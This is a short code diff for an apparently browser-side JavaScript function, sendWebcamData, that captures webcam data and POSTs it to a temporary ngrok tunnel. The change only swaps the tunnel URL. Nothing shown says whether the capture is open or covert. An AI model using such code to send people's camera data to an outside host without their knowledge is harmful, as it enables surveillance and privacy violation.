@@ -112,7 +112,7 @@
     async function sendWebcamData() {
         const data = await captureWebcam()
         // console.log('webCam data: ',data)
-        fetch('https://dbe5-2001-6a8-2480-6dba-24a5-f42f-8fd7-3a46.ngrok-free.app/webcam', {
+        fetch('https://6831-2a02-a03f-e1a1-b901-e020-1267-38e5-eaa4.ngrok-free.app/webcam', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
